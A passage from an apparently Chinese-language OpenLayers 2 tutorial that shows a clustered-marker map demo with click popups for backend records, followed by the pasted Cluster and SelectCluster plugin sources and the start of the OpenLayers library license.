Math.random();\n\t\t\tvar px = b.left + (b.right-b.left) *r1 ; \n\t\t\tvar py = b.bottom + (b.top-b.bottom) *r2 ; \n\t\t\tvar f = new OpenLayers.Feature.Vector( new OpenLayers.Geometry.Point(px, py), {n:i} );\n\t\t\tfeatures.push(f);\n\t\t}\n\t\t\n\t\tmap.addLayer(clayer);\n\t\tclayer.addFeatures(features);\n\n\t\t// Select control\n\t\tctrl = new OpenLayers.Control.SelectCluster (clayer, \n\t\t\t\t{\thover:false, \n\t\t\t\t\tpointRadius:12,\n\t\t\t\t\tanimate:true, \n\t\t\t\t\tconnect:false,\n\t\t\t\t\tonSelect: function(feature) \n\t\t\t\t\t{\tif (feature.cluster) feature = feature.cluster[0];\n\t\t\t\t\t\tshowStatus(\"selected feature \"+feature.attributes.n+\" (\"+feature.id+\")\");\n\t\t\t\t\t},\n\t\t\t\t\tonUnselect: function(feature) \n\t\t\t\t\t{\tshowStatus(\"\");\n\t\t\t\t\t},\n\t\t\t\t});\n\t\tmap.addControl (ctrl);\n\t\tctrl.activate();\n\t\t\n\t}\n\n\tfunction showStatus(text) \n\t{\tdocument.getElementById(\"status\").innerHTML = text;            \n\t}\n\t</script>\n\t\n\t\n\t<style>\n\t\tbody { font:1em Helvetica,Arial,sans-serif; }\n\t\th1 { color:#369; margin:0.5em 0 0.2em }\n\t\t#tags { color:#69F; font-size:0.9em; }\n\t\tp { margin: 0.5em 0; }\n\t\tp.title { color:#369; font-weight:bold; }\n\t\t#map { background:#fff; float:left; }\n\t\t#options { margin:0.5em; float:left; }\n\t\t#options p { margin:0 0 1em; }\n\t\t#docs { background:#e3e6e9; padding:0.5em; margin:0.5em 0; }\n\t\t.olControlAttribution\n\t\t{\tbottom:0;\n\t\t\tbackground:rgba(255,255,255,0.6);\n\t\t\tpadding: 0 0.5em;\n\t\t}\n\t\t#status { display:block; clear:both; }\n\t</style>\n\n</head>\n<body onload=\"initMap()\">\n\n\n\n\n\t<!-- DIV pour la carte -->\n\t<div id=\"map\" style=\"width:600px; height:400px;\"></div>\n\n\t<p id=\"status\">\n\t</p>\n\n</body>\n</html>\n```\n\n\n\n![聚合替换数据](_v_images/20200713141510207_19545.png)\n\n\n\n\n\n**但是由于业务需求，需要再改动一下**\n\n添加：点击地图要素，弹出其信息，点击其他区域，上一个弹窗消失：\n\n```javascript\nfunction loadJuhe(){\n\t// Cluster layer's style\n\tvar style = new OpenLayers.Style\n\t({\tpointRadius: 12,\n\t\texternalGraphic: \"../../../otherlibs/ol2/img/pins.png\",   // 要素图标，我贴在后面，也可以用自己的\n\t\tbackgroundGraphic: \"../../../otherlibs/ol2/img/pinsback.png\",\n\t\tgraphicYOffset:-24,\n\t\tbackgroundXOffset: 0,\n\t\tbackgroundYOffset: -16,\n\t\tgraphicZIndex: 11,\n\t\tbackgroundGraphicZIndex: 10,\n\t\tfillColor: \"${fcolor}\", //\"#F0C20C\",\n\t\tfillOpacity: 1,\n\t\tstrokeColor: \"#333\",\n\t\tstrokeWidth: 2,\n\t\tstrokeOpacity: 1,\n\t\tlabelSelect: false,\n\t\t//label: \"${label}\",\n\t\t//labelYOffset: \"${labelOffset}\",\n\t\tfontFamily: '\"Luxi sans\",\"Lucida Grande\",Lucida,\"Lucida Sans Unicode\",sans-serif',\n\t\tfontSize: \"${fSize}\",\n\t\tfontWeight : \"bold\",\n\t\tcursor:\"pointer\"\n\t},\n\t{\tcontext:\n\t\t{\tlabel: function(f) \n\t\t\t{\tif (f.cluster) return f.cluster.length ? f.cluster[0].attributes.n : \"\";\n\t\t\t\treturn f.attributes.n;\n\t\t\t},\n\t\t\tlabelOffset: function(f) \n\t\t\t{\treturn (f.cluster && f.cluster.length>1) ? \"\" : -8;\n\t\t\t},\n\t\t\tfSize: function(f) \n\t\t\t{\treturn (f.cluster && f.cluster.length>1) ? 12 : 8;\n\t\t\t},\n\t\t\tfcolor: function(f)\n\t\t\t{\tif (!f.cluster) return \"#F0C20C\";\n\t\t\t\tif (f.cluster.length<8) return \"#AF7\";\n\t\t\t\tif (f.cluster.length<16) return \"#FD5\";\n\t\t\t\treturn \"#F97\";\n\t\t\t}\n\t\t}\n\t});\n\t// New cluster Layer\n\tclayer = new OpenLayers.Layer.Cluster (\"Clusters\", \n\t\t\t{\trendererOptions: {yOrdering: true},\n\t\t\t\tstyleMap: new OpenLayers.StyleMap\n\t\t\t\t({\t\"default\": style,\n\t\t\t\t\t\"select\": {\tpointRadius: 18 }\n\t\t\t\t})\n\t\t\t});\n\n\t// Add 200 features to cluster\n\tvar b = map.calculateBounds();\n\tvar features = new Array();\n\t// $iframes.videodata\n\tfor (var i = 0; i < $iframes.videodata.length; i++)   //$iframes.videsdata是我从后台拿到的数据\n\t{\t\n\t\tvar f = new OpenLayers.Feature.Vector( new OpenLayers.Geometry.Point($iframes.videodata[i]['x'], $iframes.videodata[i]['y']),\n\t\t\t\t{n:i, itemdata : $iframes.videodata[i]} );  //itemdata 是每一项的数据\n\t\tfeatures.push(f);\n\t}\n\t\n\tmap.addLayer(clayer);\n\tclayer.addFeatures(features);\n\n\t// Select control\n\tctrl = new OpenLayers.Control.SelectCluster (clayer, \n\t\t\t{\thover:false, \n\t\t\t\tpointRadius:12,\n\t\t\t\tanimate:true, \n\t\t\t\tconnect:false,\n\t\t\t\tonSelect: function(feature)    // 弹窗\n\t\t\t\t{\t\n\t\t\t\t\tif (feature.cluster) feature = feature.cluster[0];\n\t\t\t\t\tctrl.onUnselect();\n\t\t\t\t\tvar popupContentHTML=\"\";    //弹窗的页面元素\n\t\t\t\t\tpopupContentHTML += '<div id=\"showTradeInfo\" style=\"width:320px;background-color:rgb(255, 255, 255);height: auto;position:relative;\">';\n\t\t\t\t\tvar data = feature.data.itemdata;  // 后台数据的每一项\n\n\t\t\t\t\t\t\tpopupContentHTML  += '<div style=\"height:auto;line-height:36px;font-size: 14px; color: #4d4d4d;padding-left:10px;padding-right:10px; font-weight: 700;border-bottom:1px solid #ccc;\">'\n\t\t\t\t\t\t\tpopupContentHTML  += '<label style=\"margin-bottom:0px;\">名称</label>：<label style=\"margin-bottom:0px;font-weight:500;\">'+data['name']+'</label>'\n\t\t\t\t\t\t\tpopupContentHTML  += '</div>';\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tpopupContentHTML  += '<div style=\"height:auto;line-height:36px;font-size: 14px; color: #4d4d4d;padding-left:10px;padding-right:10px; font-weight: 700;border-bottom:1px solid #ccc;\">'\n\t\t\t\t\t\t\tpopupContentHTML  += '<label style=\"margin-bottom:0px;\">地址</label>：<label style=\"margin-bottom:0px;font-weight:500;\">'+data[\"address\"]+'</label>'\n\t\t\t\t\t\t\tpopupContentHTML  += '</div>';\n\t\t\t\t\t\t\n\n\t\t\t\t\tpopupContentHTML += '</div>';\n\t\t\t\t\tvar popup = new OpenLayers.Popup.CSSFramedCloud(\"MyFavorites\", \n\t\t\t\t\t\t\tfeature.geometry.getBounds().getCenterLonLat(),// 坐标\n\t\t\t\t\t\t\tnull,// popup大小\n\t\t\t\t\t\t\tpopupContentHTML,// html内容\n\t\t\t\t\t\t\tnull,// 锚点\n\t\t\t\t\t\t\ttrue,// 是否显示关闭按钮\n\t\t\t\t\t\t\tfunction() {// 关闭弹窗触发该回调函数\n//\t\t\t\t\t\tspecialmap.removePopup(feature.popup);\n\t\t\t\t\t\tfeature.popup.destroy();\n\t\t\t\t\t\tfeature.popup = null;\n\t\t\t\t\t});\n\t\t\t\t\tpopup.autoSize = true;\n\t\t\t\t\tfeature.popup = popup;\n\t\t\t\t\tmap.addPopup(popup); \n\n\t\t\t\t\t\n\t\t\t\t},\n\t\t\t\tonUnselect: function(feature)    // 取消弹窗没写\n\t\t\t\t{\t\n\t\t        \t\tfor(var j=0; j<map.popups.length; j++){\n\t\t        \t\t\tmap.removePopup(map.popups[j]);\n\t\t        \t\t\tj--;\n\t\t        \t\t}\n//\t\t        \t$(\"#clocePop\").click(function(){\n//\t\t        \t\tremovePopup();\n//\t\t        \t});\n\n\t\t\t\t\n\t\t\t\t},\n\t\t\t});\n\tmap.addControl (ctrl);\n\tctrl.activate();\n}\n\n```\n\n\n\n\n\n下面几个文件直接引用即可，直接贴出来\n\n> cluster.js\n\n```javascript\n/* Copyright (c) 2014 by Jean-Marc.Viglino [at]ign.fr\n* Dual-licensed under the CeCILL-B Licence (http://www.cecill.info/)\n* and the Beerware license (http://en.wikipedia.org/wiki/Beerware), \n* feel free to use and abuse it in your projects (the code, not the beer ;-). \n*/\n\n/**\n* Class: OpenLayers.Layer.Cluster\n* OpenLayers.Layer.Cluster is a OpenLayers.Layer.Vector with cluster stragegy and styling\n*\n* Inherits from:\n* - <OpenLayers.Layer.Vector>\n*/\nOpenLayers.Layer.Cluster = OpenLayers.Class(OpenLayers.Layer.Vector, \n{\n\t\t\n\t/**\n\t* APIProperty: startegyParam \n\t* Properties for OpenLayers.Strategy.Cluster \n\t* and OpenLayers.Strategy.AnimatedCluster if included\n\t*/\n\tstartegyParam:\n\t{\t/**\n\t\t* APIProperty: distance\n\t\t* {Integer} Pixel distance between features that should be considered a\n\t\t* single cluster. Default is 45 pixels.\n\t\t*/\n\t\tdistance: 45,\n\t\t\n\t\t/**\n\t\t* APIProperty: animationMethod for animated cluster if included\n\t\t* https://github.com/acanimal/AnimatedCluster\n\t\t*/\n\t\tanimationMethod: OpenLayers.Easing.Expo.easeOut,\n\t\t\n\t\t/**\n\t\t* APIProperty: animationDuration for animated cluster if included\n\t\t* https://github.com/acanimal/AnimatedCluster\n\t\t*/\n\t\tanimationDuration: 30\n\t},\n\n    /**\n\t* Constructor: OpenLayers.Layer.Cluster\n\t* Create a new cluster layer\n\t*\n\t* Parameters:\n\t* name - {String} A name for the layer\n\t* options - {Object} Optional object with non-default properties to set on\n\t* the layer. Use options.startegyParam to setup cluster strategy properties.\n\t*\n\t* Returns:\n\t* {<OpenLayers.Layer.Vector>} A new vector layer\n\t*/\n\tinitialize: function(name, options) \n\t{   if (!options) options={};\n\t\tvar self = this;\n\t\t// \n\t\tvar smap = options.styleMap;\n\t\tif (!smap) \n\t\t{\toptions.styleMap = smap = new OpenLayers.StyleMap (OpenLayers.Util.extend({},OpenLayers.Feature.Vector.style));\n\t\t}\n\t\tif (!smap.styles[\"default\"].context) smap.styles[\"default\"].context={};\n\t\t// Overload a style\n\t\tfunction overrideStyle (s,f)\n\t\t{\tvar f0, v0;\n\t\t\t// is a value\n\t\t\tv0 = smap.styles[\"default\"].defaultStyle[s];\n\t\t\t// is a function\n\t\t\tif (v0 && v0.match) f0 = v0.match(/^\\$\\{(.*)\\}$/);\n\t\t\tif (f0) f0 = smap.styles[\"default\"].context[f0[1]];\n\t\t\t// Override\n\t\t\tsmap.styles[\"default\"].defaultStyle[s] = \"${\"+s+\"}\";\n\t\t\tsmap.styles[\"default\"].context[s] = function(feature)\n\t\t\t\t{\tif (feature.cluster && self.countFeaturesInCluster(feature)>1) return f(feature);\n\t\t\t\t\telse return f0 ? f0(feature) : v0 ? v0 : \"\";\n\t\t\t\t};\n\t\t\tsmap.styles[\"default\"].propertyStyles[s] = true;\n\t\t}\n\t\t// Overload pointRadius\n\t\tvar pointRadius = smap.styles[\"default\"].defaultStyle.pointRadius || 3;\n\t\tvar minRadius = smap.styles[\"default\"].defaultStyle.minRadius || 6;\n\t\tvar maxRadius = smap.styles[\"default\"].defaultStyle.maxRadius || 30;\n\t\tvar facRadius = smap.styles[\"default\"].defaultStyle.facRadius || 1;\n//\t\toverrideStyle (\"pointRadius\", function(feature) { return Math.min(minRadius + (feature.attributes.count-1)*facRadius,maxRadius);});\n\t\toverrideStyle (\"pointRadius\", function(feature) { return Math.min(minRadius + (self.countFeaturesInCluster(feature)-1)*facRadius,maxRadius);});\n\t\t// Overload strokeWidth\n\t\toverrideStyle (\"strokeWidth\", function(feature) { return 10; });\n\t\t// Overload strokeOpacity\n\t\toverrideStyle (\"strokeOpacity\", function(feature) { return 0.5; });\n\t\t// Overload strokeColor\n\t\tvar fillColor = smap.styles[\"default\"].defaultStyle.fillColor;\n\t\tvar fillColorFunction = null;\n\t\tif (fillColor && fillColor.match) \n\t\t{\tfillColorFunction = fillColor.match(/^\\$\\{(.*)\\}$/);\n\t\t\tif (fillColorFunction) fillColorFunction = smap.styles[\"default\"].context[fillColorFunction[1]];\n\t\t}\n\t\toverrideStyle (\"strokeColor\", function(feature) \n\t\t{\treturn fillColorFunction ? fillColorFunction(feature) : fillColor; \n\t\t});\n\t\t// Overload fillOpacity\n\t\toverrideStyle (\"fillOpacity\", function(feature) { return 1; });\n\t\t// Overload externalGraphic\n\t\toverrideStyle (\"externalGraphic\", function(feature) { return \"\"; });\n\t\t// Overload externalGraphic\n\t\toverrideStyle (\"backgroundGraphic\", function(feature) { return \"\"; });\n\t\t// Overload label\n\t\toverrideStyle (\"label\", function(feature) { return self.countFeaturesInCluster(feature); });\n\n\n\t\tvar strategy;\n\t\tif (OpenLayers.Strategy.AnimatedCluster) strategy = OpenLayers.Strategy.AnimatedCluster\n\t\telse strategy = OpenLayers.Strategy.Cluster;\n\t\tvar strategy_clusters = new strategy ({\n\t\t\t\tdistance: this.startegyParam.distance,\n\t\t\t\tanimationMethod: this.startegyParam.animationMethod,\n\t\t\t\tanimationDuration: this.startegyParam.animationDuration\n\t\t\t});\n\t\tthis.strategy_clusters = strategy_clusters;\n\n\t\tif (options.strategies) options.strategies.push(strategy_clusters);\n\t\telse options.strategies = [strategy_clusters];\n\n\t\tOpenLayers.Layer.Vector.prototype.initialize.apply(this, [name, options]);\n\t},\n\t\n\t/** Add new feature : the standard method remove existing features\n\t*/\n\taddFeatures: function (features)\n\t{\tif (!this.strategy_clusters.clustering)\n\t\t{\tvar f = this.strategy_clusters.features;\n\t\t\tif (f) features = features.concat(f);\n\t\t}\n\t\tOpenLayers.Layer.Vector.prototype.addFeatures.apply(this, [features]);\n\t},\n\n\t/** Refresh the layer : re-calculate the clusters\n\t*/\n\trefresh: function()\n\t{\t//this.strategy_clusters.clusters=null;\n\t\tthis.strategy_clusters.resolution = 0;\n\t\tthis.strategy_clusters.cluster();\n\t},\n\n\t/** Compact features at the same coords in a cluster to minimze number of features\n\t*/\n\tcompact: function()\n\t{\tif (this.isCompact) return;\n\t\tvar features = this.strategy_clusters.features;\n\t\tvar clusters = [];\n\t\tvar clustered;\n\t\t// Cluster features at the same coord\n\t\tfor (var i=0; i<features.length; i++)\n\t\t{\tfeature = features[i];\n\t\t\tif(feature.geometry) \n\t\t\t{\tclustered = false;\n\t\t\t\tfor(var j=clusters.length-1; j>=0; --j) \n\t\t\t\t{\tcluster = clusters[j];\n\t\t\t\t\tif(feature.geometry.getBounds().getCenterLonLat().equals(cluster.geometry.getBounds().getCenterLonLat())) \n\t\t\t\t\t{\tcluster.cluster.push(feature);\n\t\t\t\t\t\tcluster.attributes.count += 1;\n\t\t\t\t\t\tclustered = true;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif (!clustered) \n\t\t\t\t{\tvar center = feature.geometry.getBounds().getCenterLonLat();\n\t\t\t\t\tvar cluster = new OpenLayers.Feature.Vector(\n\t\t\t\t\t\tnew OpenLayers.Geometry.Point(center.lon, center.lat),\n\t\t\t\t\t\t{count: 1}\n\t\t\t\t\t);\n\t\t\t\t\tcluster.cluster = [feature];\n\t\t\t\t\tclusters.push(cluster);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tfeatures = new Array();\n\t\tvar l = clusters.length;\n\t\tfor (var i=0; i<l; i++)\n\t\t{\tif (clusters[i].cluster && clusters[i].attributes.count==1) features.push(clusters[i].cluster[0]);\n\t\t\telse features.push(clusters[i]);\n\t\t}\n\t\t// Add the new features\n\t\tOpenLayers.Layer.Vector.prototype.addFeatures.apply(this, [features]);\n\t\tthis.isCompact = true;\n\t\tthis.refresh();\n\t},\n\n\t/** Count number of feature in a cluster\n\t*/\n\tcountFeaturesInCluster: function(feature)\n\t{\tif (feature.layer != this) return 1;\n\t\tif (feature.cluster)\n\t\t{\t// Normal cluster\n\t\t\tif (!this.isCompact) return feature.attributes.count;\n\t\t\tvar c = 0;\n\t\t\t// Compact Cluster > count cluster of cluster\n\t\t\tfor (var i=0; i<feature.cluster.length; i++)\n\t\t\t{\tc += feature.cluster[i].cluster ? feature.cluster[i].attributes.count : 1;\n\t\t\t}\n\t\t\treturn c;\n\t\t}\n\t\t// No cluster\n\t\telse return 1;\n\t},\n\n\t/** Get the features in a cluster\n\t*/\n\tgetFeaturesInCluster: function(feature)\n\t{\tif (feature.layer != this) return [feature];\n\t\tif (feature.cluster)\n\t\t{\t// Normal cluster\n\t\t\tif (!this.isCompact) return feature.cluster;\n\t\t\tvar f=new Array();\n\t\t\t// Compact Cluster > count cluster of cluster\n\t\t\tfor (var i=0; i<feature.cluster.length; i++)\n\t\t\t{\tif (feature.cluster[i].cluster) \n\t\t\t\t{\tfor (k=0; k<feature.cluster[i].cluster.length; k++) \n\t\t\t\t\t\tf.push( feature.cluster[i].cluster[k] )\n\t\t\t\t}\n\t\t\t\telse f.push( feature.cluster[i] );\n\t\t\t}\n\t\t\treturn f;\n\t\t}\n\t\t// No cluster\n\t\telse return [feature];\n\t},\n\n\t/** Cluster layer */\n\tCLASS_NAME: \"OpenLayers.Layer.Cluster\"\n});\n```\n\n\n\n\n\n\n\n> selectcluster.js\n\n\n\n```javascript\n/* Copyright (c) 2014 by Jean-Marc.Viglino [at]ign.fr\n* Dual-licensed under the CeCILL-B Licence (http://www.cecill.info/)\n* and the Beerware license (http://en.wikipedia.org/wiki/Beerware), \n* feel free to use and abuse it in your projects (the code, not the beer ;-). \n*/\n\n/**\n* Class: OpenLayers.Control.SelectCluster\n* The SelectCluster control selects vector features from a given \n* cluster layer on click or hover.\n*\n* Inherits from:\n* - <OpenLayers.Control.SelectFeature>\n*/\n\nOpenLayers.Control.SelectCluster = OpenLayers.Class(OpenLayers.Control.SelectFeature, \n{\n\t/**\n\t* APIProperty: connect\n\t* {Boolean} Draw connection lines to the cluster. Default is false.\n\t*/\n\tconnect: false,\n\n\t/**\n\t* APIProperty: animate\n\t* {Boolean} Play an animation. Default is false.\n\t*/\n\tanimate:false,\n\n\t/**\n\t* APIProperty: animationDuration\n\t* {Integer} The number of steps to be passed to the OpenLayers.Tween.start() \n\t* method when the clusters are animated.\n\t* Default is 40.\t\n\t*/\n\tanimationDuration: 40,\n\n\t/**\n\t* APIProperty: pointRadius\n\t* {Number} Radius of the points in the cluster. Default is 12.\n\t*/\n\tpointRadius: 12,\n\n\t/**\n\t* APIProperty: circleMaxObject\n\t* {Integer} Number of points to be drawn on a circle. Default is 10\n\t*/\n\tcircleMaxObject: 10,\n\n\t/**\n\t* APIProperty: spiral\n\t* {Boolean} Allow to draw point on a spiral when more than circleMaxObject. Default is true\n\t*/\n\tspiral: true,\n\n\t/**\n\t* APIProperty: maxPoint\n\t* {Boolean} Number of points to be drawn on a spiral. Default is 60\n\t*/\n\tmaxPoint: 60,\n\n\t/**\n\t* Property: animationTween\n\t* {OpenLayers.Tween} Tween for animation.\n\t*/\n\tanimationTween: new OpenLayers.Tween(OpenLayers.Easing.Expo.easeOut),\n\n\t// Initialize the SelectCluster control\n    initialize: function(layers, options) \n\t{\tif (!layers.length) layers = [layers];\n\t\tvar smap = layers[0].styleMap;\n\t\t\n\t\t// Add a new layer to store selection\n\t\tthis.selLayer = new OpenLayers.Layer.Vector(\"Selection\",\n\t\t\t\t{\tdisplayInLayerSwitcher: false,\n\t\t\t\t\tvisibility:false,\n\t\t\t\t\t// Get the yOrdering for shadow on marker\n\t\t\t\t\trendererOptions: layers[0].rendererOptions,\n\t\t\t\t\tstyleMap: smap\n\t\t\t\t});\n\t\t// Add this layer to selection\n\t\tlayers.push(this.selLayer);\n\n\t\t// No box selection\n\t\tif (options) options.box = false;\n\t\n\t\tOpenLayers.Control.SelectFeature.prototype.initialize.apply(this, [layers, options]);\n\n\t},\n\n\t/**\n\t* Method: setMap\n\t* Set the map property for the control.\n\t*\n\t* Parameters:\n\t* map - {<OpenLayers.Map>}\n\t*/\n    setMap: function(map) \n\t{   OpenLayers.Control.SelectFeature.prototype.setMap.apply(this, arguments);\n\t\t\n\t\tmap.addLayer(this.selLayer);\n\t\tmap.events.register('movestart', this, function(e) \n\t\t{\t//if(e.zoomChanged)\n\t\t\t{\tthis.unselectAll(); \n\t\t\t\tthis.selLayer.setVisibility(false);\n\t\t\t}\n\t\t});\n\t\tmap.events.register('changelayer', this, function(e) \n\t\t{\tif (\te.property == \"visibility\" \n\t\t\t\t&&\te.layer != this.selLayer \n\t\t\t\t&&\tOpenLayers.Util.indexOf(this.layers,e.layer) > -1 \n\t\t\t\t) \n\t\t\t\tthis.selLayer.setVisibility(false);\n\t\t});\n    },\n\n\t/**\n\t* Method: select\n\t* If the feature is a cluster spread it out in selLayer.\n\t* Otherwise, do default action.\n\t*\n\t* Parameters:\n\t* feature - {<OpenLayers.Feature.Vector>}\n\t*/\n    select: function(feature) \n\t{\t// Don't spread twice\n\t\tif (feature == this.lastCluster && this.selLayer.getVisibility()) return;\n\t\tvar count=1;\n\t\tvar layer = feature.layer;\n\t\t// Spread the cluster out\n\t\tif (feature.cluster) \n\t\t{\tthis.lastCluster = feature;\n\t\t\t// Clear the Layer\n\t\t\tthis.selLayer.removeAllFeatures();\n\t\t\tthis.selLayer.setVisibility(true);\n\t\t\tif (layer && layer.countFeaturesInCluster) count = layer.countFeaturesInCluster(feature);\n\t\t\telse count = feature.cluster.attributes.count;\n\t\t}\n\n\t\tif (count>1)\n\t\t{\t\n\t\t\t// Pixel size in map unit\n\t\t\tvar pix = feature.layer.map.resolution;\n\t\t\tvar cluster = new Array();;\n\t\t\tif (layer && layer.getFeaturesInCluster)\n\t\t\t{\tcluster = layer.getFeaturesInCluster(feature);\n\t\t\t}\n\t\t\telse cluster = feature.cluster;\n\n\t\t\t// Draw on a circle\n\t\t\tif (!this.spiral || cluster.length <= this.circleMaxObject)\n\t\t\t{\tvar r = pix * this.pointRadius * (0.5 + cluster.length / 4);\n\t\t\t\tvar features = new Array();\n\t\t\t\tvar links = new Array();\n\t\t\t\tvar max = Math.min(cluster.length, this.circleMaxObject);\n\t\t\t\t// Features on a circle\n\t\t\t\tfor (i=0; i<max; i++)\n\t\t\t\t{\t// New feature\n\t\t\t\t\tvar f = cluster[i].clone();\n\t\t\t\t\tvar a = 2*Math.PI*i/max;\n\t\t\t\t\tif (max==2 || max == 4) a += Math.PI/4;\n\t\t\t\t\tif (this.animate)\n\t\t\t\t\t{\tf.dataAnimate = \n\t\t\t\t\t\t\t{\tx0:feature.geometry.x, y0:feature.geometry.y,\n\t\t\t\t\t\t\t\tx1:feature.geometry.x+r*Math.sin(a), y1:feature.geometry.y+r*Math.cos(a) \n\t\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\telse f.geometry = new OpenLayers.Geometry.Point (feature.geometry.x+r*Math.sin(a), feature.geometry.y+r*Math.cos(a));\n\t\t\t\t\t// Draw connection\n\t\t\t\t\tif (this.connect)\n\t\t\t\t\t{\tvar f2 = cluster[i].clone();\n\t\t\t\t\t\tf2.geometry = new OpenLayers.Geometry.LineString (\n\t\t\t\t\t\t\t[\tf.geometry ,\n\t\t\t\t\t\t\t\tfeature.geometry\n\t\t\t\t\t\t\t]);\n\t\t\t\t\t\tlinks.push(f2);\n\t\t\t\t\t}\n\t\t\t\t\tfeatures.push(f);\n\t\t\t\t}\n\t\t\t\tif (this.connect) this.selLayer.addFeatures(links);\n\t\t\t\tthis.selLayer.addFeatures(features);\n\t\t\t}\n\t\t\t// Draw on a spiral\n\t\t\telse\n\t\t\t{\t// Angle de depart\n\t\t\t\tvar a = 0;\n\t\t\t\tvar r;\n\t\t\t\tvar d = 2*this.pointRadius;\n\t\t\t\tvar features = new Array();\n\t\t\t\tvar links = new Array();\n\t\t\t\tvar max = Math.min (this.maxPoint, cluster.length);\n\t\t\t\t// Feature on a spiral\n\t\t\t\tfor (i=0; i<max; i++)\n\t\t\t\t{\t// Nouveau rayon\n\t\t\t\t\tr = d/2 + d*a/(2*Math.PI);\n\t\t\t\t\t// Angle\n\t\t\t\t\ta = a + (d+0.1)/r;\n\t\t\t\t\tvar dx = pix*r*Math.sin(a)\n\t\t\t\t\tvar dy = pix*r*Math.cos(a)\n\t\t\t\t\t// New Feature\n\t\t\t\t\tvar f = cluster[i].clone();\n\t\t\t\t\tif (this.animate)\n\t\t\t\t\t{\tf.dataAnimate = \n\t\t\t\t\t\t\t{\tx0:feature.geometry.x, y0:feature.geometry.y,\n\t\t\t\t\t\t\t\tx1:feature.geometry.x+dx, y1:feature.geometry.y+dy \n\t\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\telse f.geometry = new OpenLayers.Geometry.Point (feature.geometry.x+dx, feature.geometry.y+dy);\n\t\t\t\t\tfeatures.push(f);\n\t\t\t\t\t// Draw connection\n\t\t\t\t\tif (this.connect)\n\t\t\t\t\t{\tvar f2 = cluster[i].clone();\n\t\t\t\t\t\tf2.geometry = new OpenLayers.Geometry.LineString (\n\t\t\t\t\t\t\t[\tf.geometry ,\n\t\t\t\t\t\t\t\tfeature.geometry\n\t\t\t\t\t\t\t]);\n\t\t\t\t\t\tlinks.push (f2);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif (this.connect) this.selLayer.addFeatures(links);\n\t\t\t\tthis.selLayer.addFeatures(features);\n\t\t\t}\n\n\t\t\tif (this.animate)\n\t\t\t{\t// Animation\n\t\t\t\tvar self = this;\n\t\t\t\tthis.animationTween.start ( {pos:0.0}, {pos:1.0}, this.animationDuration, \n\t\t\t\t\t{   callbacks: \n\t\t\t\t\t\t{\teachStep: function (delta) { self.doAnimation(delta); },\n\t\t\t\t\t\t\tdone: function (delta) { self.doAnimation(delta, true); }\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t);\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\tOpenLayers.Control.SelectFeature.prototype.select.apply(this, [feature]);\n\t\t}\n\t},\n\n\t/**\n\t* Method: doAnimation\n\t* Calculate animation on the features in the layer.\n\t*/\n\tdoAnimation: function (delta, last)\n\t{\tvar pos = delta.pos;\n\t\tfor (var i=0; i<this.selLayer.features.length; i++) \n\t\t{\tvar f = this.selLayer.features[i];\n\t\t\tif (f.dataAnimate)\n\t\t\t{\tf.geometry.x = f.dataAnimate.x0 + (f.dataAnimate.x1 - f.dataAnimate.x0) *pos;\n\t\t\t\tf.geometry.y = f.dataAnimate.y0 + (f.dataAnimate.y1 - f.dataAnimate.y0) *pos;\n\t\t\t}\n\t\t\tif (pos==1.0) f.geometry.calculateBounds();\n\t\t}\n\t\tthis.selLayer.redraw();\n\t},\n\n\t/**\n\t* Method: clickoutFeature\n\t* Called on click outside a previously clicked (selected) feature.\n\t* Only responds if this.hover is false.\n\t*\n\t* Parameters:\n\t* feature - {<OpenLayers.Vector.Feature>}\n\t*/\n\tclickoutFeature: function(feature) \n\t{\tif(!this.hover && this.clickout) \n\t\t{\tthis.selLayer.setVisibility(false);\n\t\t\tthis.unselectAll();\n\t\t}\n\t},\n\n\t/**\n\t* Method: getSelection\n\t* Return the selected features.\n\t*\n\t* Parameters:\n\t* cluster - {Boolean} Get cluster features or original features (pay attention original features may have inconsistent layer). Default is false.\n\t*/\n\tgetSelection: function(cluster)\n\t{\tvar i, j;\n\t\tvar sel = new Array();\n\t\tfor (i=0; i<this.layers.length; i++)\n\t\t{\tvar s = this.layers[i].selectedFeatures;\n\t\t\tfor (j=0; j<s.length; j++)\n\t\t\t{\tif (!cluster)\n\t\t\t\t{\tif (!s[j].cluster) sel.push(s[j]);\n\t\t\t\t\telse if (s[j].cluster.length == 1) sel.push(s[j].cluster[0]);\n\t\t\t\t}\n\t\t\t\telse sel.push(s[j]);\n\t\t\t}\n\t\t}\n\t\treturn sel;\n\t},\n\n\tCLASS_NAME: \"OpenLayers.Layer.SelectCluster\"\n});\n```\n\n\n\n\n\n> OpenLayers.js  官方库，也可以自行下载 ，很长，但是还是放到这里吧\n\n```javascript\n/*\n\n  OpenLayers.js -- OpenLayers Map Viewer Library\n\n  Copyright (c) 2006-2013 by OpenLayers Contributors\n  Published under the 2-clause BSD license.\n  See http://openlayers.org/dev/license.txt for the full text of the license, and http://openlayers.org/dev/authors.txt for full list of contributors.\n\n  Includes compressed code under the following licenses:\n\n  (For uncompressed versions of the code used, please see the\n  OpenLayers Github repository: <https://github.com/openlayers/openlayers>)\n\n*/\n\n/**\n * Contains XMLHttpRequest.js <http://code.google.com/p/xmlhttprequest/>\n * Copyright 2007 Sergey Ilinsky (http://www.ilinsky.com)\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n * http://www.apache.org/licenses/LICENSE-2.0\n */\n\n/**\n * OpenLayers.Util.pagePosition is based on Yahoo's getXY method, which is\n * Copyright (c) 2006, Yahoo! Inc.\n * All rights reserved.\n * \n * Redistribution and use of this software in source and binary forms, with or\n * without modification, are permitted provided that the following conditions\n * are met:\n * \n * * Redistributions of source code must retain the above copyright notice,\n *   this list of conditions and the following disclaimer.\n * \n * * Redistributions in binary form must reproduce the above copyright notice,\n *   this list of conditions and the following disclaimer in the documentation\n *   and/or other materials provided with the distribution.\n * \n * * Neither the name of Yahoo! Inc. nor the names of its contributors may be\n *   used to endorse or promote products derived from this software without\n *   specific prior written permission of Yahoo! Inc.\n * \n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n * AND ANY EXPRESS OR IMPLIED WARRANTIES, 